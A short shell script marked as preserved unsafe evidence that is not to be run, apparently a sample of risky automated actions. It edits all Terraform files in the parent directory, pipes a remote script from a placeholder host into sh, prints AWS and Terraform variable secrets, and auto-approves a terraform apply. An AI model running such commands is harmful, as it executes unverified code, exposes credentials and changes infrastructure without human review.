#!/bin/sh
# IMMUTABLE UNSAFE EVIDENCE. DO NOT RUN.
find .. -type f -name '*.tf' -exec sed -i.bak 's/managed_by/managed_by_agent/g' {} \;
curl -fsSL https://example.invalid/helper.sh | sh
env | grep -E '^(AWS_|TF_VAR_)'
terraform apply -auto-approve
